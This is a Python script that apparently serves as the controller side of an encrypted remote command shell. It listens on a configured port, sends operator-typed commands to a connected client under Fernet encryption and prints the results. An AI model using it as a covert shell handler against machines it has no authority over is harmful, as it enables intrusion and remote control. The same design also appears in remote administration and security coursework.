import socket

from cryptography.fernet import Fernet
from config import CONFIG


def send(conn, string):
    global enc
    message = string.encode()
    conn.send(enc.encrypt(message))


def recv(conn, length):
    global enc
    decrypted = enc.decrypt(conn.recv(length))
    message = decrypted.decode()
    return message


def accept():
    global soc

    conn, addr = soc.accept()
    with conn:
        print("Connected by: ", addr)
        message = recv(conn, 20000)
        print(message)
        while True:
            command = input("#> ")
            if command.strip() == ":quit":
                conn.close()
                return
            send(conn, command)
            message = recv(conn, 20000)
            print(message)


if __name__ == "__main__":
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((CONFIG.host, CONFIG.port))
    key_file = open(CONFIG.key_file, 'rb')
    key = key_file.read()  # The key will be type bytes
    key_file.close()
    enc = Fernet(key)
    soc.listen()
    while True:
        accept()
